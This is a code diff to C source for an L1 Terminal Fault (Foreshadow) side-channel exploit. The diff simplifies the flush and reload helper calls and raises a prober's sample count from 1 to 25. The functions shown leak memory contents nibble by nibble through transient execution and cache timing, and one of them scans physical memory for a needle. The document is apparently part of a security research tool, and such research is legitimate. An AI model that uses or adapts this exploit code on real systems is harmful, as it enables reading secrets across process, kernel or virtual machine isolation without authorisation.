@@ -35,15 +35,15 @@ uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer) {
   ssize_t high, low;
 
   do {
-    flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0]);
+    flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, (void *)reload_buffer[0]);
     asm_l1tf_leak_high_nibble(leak_addr, reload_buffer);
-    high = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0], THRESHOLD);
+    high = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, (void *)reload_buffer[0], THRESHOLD);
   } while (high == -1);
 
   do {
-    flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0]);
+    flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, (void *)reload_buffer[0]);
     asm_l1tf_leak_low_nibble(leak_addr, &reload_buffer[0]);
-    low = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0], THRESHOLD);
+    low = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, (void *)reload_buffer[0], THRESHOLD);
   } while (low == -1);
 
   return ((high & 0x0f) << 4) | (low & 0x0f);
@@ -453,7 +453,7 @@ void *l1tf_scan_physical_memory(scan_opts_t scan_opts, size_t needle_size, char 
 
 size_t l1tf_do_leak_nibblewise_prober(void *leak_addr, reload_buffer_t *reload_buffer,
                                       void (*l1tf_leak_function)(void *, reload_buffer_t)) {
-  const size_t nr_of_probes = 1;
+  const size_t nr_of_probes = 25;
   const size_t probe_size = AMOUNT_OF_OPTIONS_IN_NIBBLE * sizeof(size_t);
   size_t *probes = malloc(probe_size);
   memset(probes, 0, probe_size);
@@ -462,9 +462,9 @@ size_t l1tf_do_leak_nibblewise_prober(void *leak_addr, reload_buffer_t *reload_b
     ssize_t nibble = -1;
     size_t attempt = 0;
     do {
-      flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0]);
+      flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, (void *)reload_buffer[0]);
       l1tf_leak_function(leak_addr, reload_buffer[0]);
-      nibble = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0], THRESHOLD);
+      nibble = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, (void *)reload_buffer[0], THRESHOLD);
       attempt += 1;
     } while (nibble == -1 && attempt < 250);
 
